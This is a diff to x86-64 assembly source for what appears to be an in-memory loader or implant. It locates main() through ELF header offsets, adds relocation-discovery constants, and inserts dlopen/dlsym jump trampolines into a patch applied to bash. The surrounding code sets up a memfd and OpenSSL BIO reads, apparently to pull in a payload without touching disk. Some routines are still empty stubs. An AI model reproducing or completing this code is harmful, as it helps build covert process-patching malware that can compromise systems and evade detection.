@@ -66,12 +66,17 @@ BITS 64
 ; 5mb, as a yolo
 %define STACKSPACE          0x500000
 
-; useful offsets
+; useful offsets for discovering main()
 %define e_entry_offset      24
 ; e_entry + 27 is the lea we want.
 %define main_offset         27
 ; 31 is the rip offset we need
 %define main_rip_offset     31
+
+; useful offsets for discovering relocations
+%define e_shoff_offset      40
+%define e_shentsize         58
+
 
 ; Macros, these two are used for the patch
 %macro resolve_symbol 2
@@ -126,6 +131,10 @@ _discover_main:
 _find_rela:
 
 
+_apply_patches:
+    ; memcpy the _patch in
+    ; set the dlopen and dlsym jumps
+
 _setup_memfd:
     xor rsi, rsi
     lea rdi, [rel _str_BIO_ctrl]
@@ -160,9 +169,6 @@ _str_null:
 
 ; Now lets move onto the patch we are applying to bash!
 
-%define _dlopen $_patch - 14
-%define _dlsym $_patch - 7
-
 ; rsp - buffer - we are just trashing the stack
 ; r12 - loop counter
 ; r13 - BIO_read
@@ -170,6 +176,20 @@ _str_null:
 ; r15 - sbio / scratch
 
 _patch:
+    jmp _patch_start
+
+; these are the opcodes for bnd jmp
+_dlopen:
+    db 0xf2, 0xff, 0x25
+_dlopen_target:
+    dd 0x41424344
+
+_dlsym:
+    db 0xf2, 0xff, 0x25
+_dlsym_target:
+    dd 0x41434344
+
+_patch_start:
 ; just need to push one value, but we'll overwrite the stack that was allocated
 ; before us.
     push rbp
